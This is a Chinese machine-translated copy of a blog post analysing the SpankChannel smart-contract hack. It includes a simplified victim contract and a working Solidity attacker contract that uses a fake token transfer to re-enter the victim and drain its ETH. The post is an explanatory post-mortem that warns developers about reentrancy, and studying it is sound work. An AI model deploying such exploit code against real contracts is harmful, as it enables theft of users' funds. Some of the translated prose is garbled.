<html>
<head>
<title>Lashing out at a Spank Channel</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">痛打一顿</h1>
<blockquote>原文：<a href="https://medium.com/coinmonks/lashing-out-at-a-spank-channel-2b42b23f0dc6?source=collection_archive---------2-----------------------#2018-10-13">https://medium.com/coinmonks/lashing-out-at-a-spank-channel-2b42b23f0dc6?source=collection_archive---------2-----------------------#2018-10-13</a></blockquote><div><div class="ef hh hi hj hk hl"/><div class="hm hn ho hp hq"><figure class="hs ht fm fo hu hv fe ff paragraph-image"><div role="button" tabindex="0" class="hw hx di hy bf hz"><div class="fe ff hr"><img src="../Images/e0f67feb1dfbf6fa5eb546d8a3fb252d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gDRa4zSg4k2YVCIPrRBXHA.jpeg"/></div></div><figcaption class="ic id fg fe ff ie if bd b be z ek">Penny Arcade classic</figcaption></figure><div class=""/><p id="730c" class="pw-post-body-paragraph jf jg ii jh b ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc hm dt translated"><em class="kd">或者我多么希望周末能远离电脑。</em></p><p id="eb54" class="pw-post-body-paragraph jf jg ii jh b ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc hm dt translated">上周，一家非常有趣、非常酷的区块链初创公司，绝对值得尊敬，被黑客攻击了。</p><p id="7cc6" class="pw-post-body-paragraph jf jg ii jh b ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc hm dt translated">事实证明，这是一次有用的黑客攻击。该团队不仅从外部审计的重要性中学到了很好的一课，攻击者还在最早的一个<a class="ae ke" href="https://github.com/jpantunes/awesome-cryptoeconomics#state-channels" rel="noopener ugc nofollow" target="_blank">州渠道</a>合同的<em class="kd"> mainnet </em>实现中发现了一个共同的攻击媒介，最终所有相关方都得到了他们的钱(回来)。</p><p id="25cf" class="pw-post-body-paragraph jf jg ii jh b ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc hm dt translated">关键的发现是，仅仅基于函数签名就相信用户提供的合同地址如预期的那样运行是一个危险的假设。</p><p id="0a89" class="pw-post-body-paragraph jf jg ii jh b ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc hm dt translated">基于实际的漏洞，我将演示攻击者的代码可能是什么样子，但是将我们需要覆盖的<a class="ae ke" href="https://etherscan.io/address/0xf91546835f756da0c10cfa0cda95b15577b84aa7#code" rel="noopener ugc nofollow" target="_blank">原始代码</a>的数量减少到最小。</p><pre class="kf kg kh ki fq kj kk kl km aw kn dt"><span id="91f3" class="ko kp ii kk b fv kq kr l ks kt">pragma solidity 0.4.25;</span><span id="d28a" class="ko kp ii kk b fv ku kr l ks kt">contract HumanStandardToken {<br/>    function transfer(address _to, uint256 _value) public returns (bool success);<br/>}</span><span id="81c1" class="ko kp ii kk b fv ku kr l ks kt">contract SpankChannel { <br/>    struct Channel {<br/>        address[2] partyAddresses; <em class="kd">// 0: partyA 1: partyI</em><br/>        uint256[4] ethBalances; <em class="kd">// 0: balanceA 1:balanceI 2:depositedA 3:depositedI</em><br/>        uint256[4] erc20Balances; <em class="kd">// 0: balanceA 1:balanceI 2:depositedA 3:depositedI</em><br/>        uint256[2] initialDeposit; <em class="kd">// 0: eth 1: tokens</em><br/>        uint256 sequence;<br/>        uint256 confirmTime;<br/>        bytes32 VCrootHash;<br/>        uint256 LCopenTimeout;<br/>        uint256 updateLCtimeout; <em class="kd">// when update LC times out</em><br/>        bool isOpen; <em class="kd">// true when both parties have joined</em><br/>        bool isUpdateLCSettling;<br/>        uint256 numOpenVC;<br/>        HumanStandardToken token;<br/>    }    <br/>    mapping(bytes32 =&gt; Channel) public Channels;<br/>    <br/>    event DidLCClose (<br/>        bytes32 indexed channelId, <br/>        uint256 sequence, <br/>        uint256 ethBalanceA,<br/>        uint256 tokenBalanceA, <br/>        uint256 ethBalanceI, <br/>        uint256 tokenBalanceI<br/>    );    </span><span id="1e5c" class="ko kp ii kk b fv ku kr l ks kt">function LCOpenTimeout(bytes32 _lcID) public {<br/>        require(msg.sender == Channels[_lcID].partyAddresses[0] <br/>                &amp;&amp; Channels[_lcID].isOpen == false<br/>        );<br/>        require(now &gt; Channels[_lcID].LCopenTimeout);<br/>        <br/>        if(Channels[_lcID].initialDeposit[0] != 0) {   <br/>            Channels[_lcID].partyAddresses[0].transfer(                        <br/>                            Channels[_lcID].ethBalances[0]<br/>            );<br/>        }<br/>        if(Channels[_lcID].initialDeposit[1] != 0) {<br/>            require(Channels[_lcID].token.transfer(<br/>                            Channels[_lcID].partyAddresses[0], <br/>                            Channels[_lcID].erc20Balances[0]),<br/>                            "CreateChannel: token transfer failure"<br/>            );<br/>        }<br/>        emit DidLCClose(<br/>            _lcID, <br/>            0, <br/>            Channels[_lcID].ethBalances[0],<br/>            Channels[_lcID].erc20Balances[0], <br/>            0, <br/>            0<br/>        );<br/>        delete Channels[_lcID];<br/>    }<br/>    <br/><em class="kd">// for illustration purposes, simplified attack setup    </em><br/>    constructor() public payable {<br/>        <em class="kd">//pre-load the state-channel contract on deployment</em><br/>        <em class="kd">//the attack will drain all eth balance from this contract</em><br/>    }<br/>    function initAttack(bytes32 _lcID) public {<br/>        Channels[_lcID].partyAddresses[0] = msg.sender;<br/>        Channels[_lcID].token = HumanStandardToken(msg.sender);        <br/>        Channels[_lcID].isOpen = false;<br/>        Channels[_lcID].LCopenTimeout = now - 1 days;<br/>        Channels[_lcID].ethBalances[0] = address(this).balance;           <br/>        Channels[_lcID].initialDeposit[0] = 1 ether;<br/>        Channels[_lcID].initialDeposit[1] = 1 ether; <br/>        Channels[_lcID].erc20Balances[0] = 1 ether;<br/>    }<br/>}</span><span id="fea3" class="ko kp ii kk b fv ku kr l ks kt">contract Lashing is HumanStandardToken {</span><span id="71ed" class="ko kp ii kk b fv ku kr l ks kt">    SpankChannel victim;<br/>    bytes32 public lcID = "A wild reentrancy appears";</span><span id="fb19" class="ko kp ii kk b fv ku kr l ks kt"><em class="kd">// payable fallback    </em><br/>    function() public payable {<br/>        if (address(victim).balance &gt;= msg.value)<br/>            attack();<br/>    }<br/><em class="kd">// ERC20-ish transfer function (same sig, different logic)    </em><br/>    function transfer(address _to, uint256 _value) <br/>        public <br/>        returns (bool success) <br/>    {<br/>        if (address(victim).balance &gt;= _value)<br/>            _to.transfer(_value);<br/>            return true;<br/>    }<br/><em class="kd">// 1 - prime the victim contract    </em><br/>    function setup(address _victim) public{<br/>        victim = SpankChannel(_victim);<br/>        victim.initAttack(lcID);<br/>    }<br/><em class="kd">// 2 - run attack    </em><br/>    function attack() public {<br/>        victim.LCOpenTimeout(lcID);<br/>    }<br/><em class="kd">// 3 - check if attack was success    </em><br/>    function getBalances() <br/>        public <br/>        view <br/>        returns(uint256 vicETH , uint256 myETH) <br/>    {<br/>        return (<br/>            address(victim).balance, <br/>            address(this).balance<br/>        );<br/>    }<br/><em class="kd">// 4 - profit!    </em><br/>    function withdraw() public {<br/>        msg.sender.transfer(address(this).balance);<br/>    }<br/>}</span></pre><p id="f27d" class="pw-post-body-paragraph jf jg ii jh b ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc hm dt translated">该漏洞存在于<code class="eh kv kw kx kk b">LCOpenTimeout </code>功能中。攻击利用恶意的<code class="eh kv kw kx kk b">transfer</code>功能，在到达<code class="eh kv kw kx kk b">delete Channels[_lcID]</code>线之前重新进入受害者的合同。攻击者的代码被受害者合同中的<code class="eh kv kw kx kk b">Channels[_lcID].token.transfer</code>指令调用，并在<code class="eh kv kw kx kk b">Channels[_lcID].partyAddresses[0].transfer(Channels[_lcID].ethBalances[0])</code>指令上循环，将受害者的所有ETH余额转移给攻击者。</p><p id="547a" class="pw-post-body-paragraph jf jg ii jh b ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc hm dt translated">没错。这是几年前攻击DAO的同一个旧的重新进入错误。聪明的合同开发者需要<a class="ae ke" href="https://www.youtube.com/watch?v=I1ZMKfFHU3U" rel="noopener ugc nofollow" target="_blank">纪律</a>否则他们会冒偶尔被狠狠揍一顿的风险。</p><ul class=""><li id="c55d" class="ky kz ii jh b ji jj jm jn jq la ju lb jy lc kc ld le lf lg dt translated">免责声明:我在ICO期间从这个项目中购买了一些代币，我相信这个项目会成功。</li></ul><blockquote class="lh"><p id="3082" class="li lj ii bd lk ll lm ln lo lp lq kc ek translated"><a class="ae ke" href="https://coincodecap.com/?utm_source=coinmonks" rel="noopener ugc nofollow" target="_blank">直接在您的收件箱中获取最佳软件交易</a></p></blockquote><figure class="ls lt lu lv lw hv fe ff paragraph-image"><a href="https://coincodecap.com/?utm_source=coinmonks"><div class="fe ff lr"><img src="../Images/7c0b3dfdcbfea594cc0ae7d4f9bf6fcb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1168/format:webp/0*OJ-qb5G6i863msBB.png"/></div></a></figure></div></div>    
</body>
</html>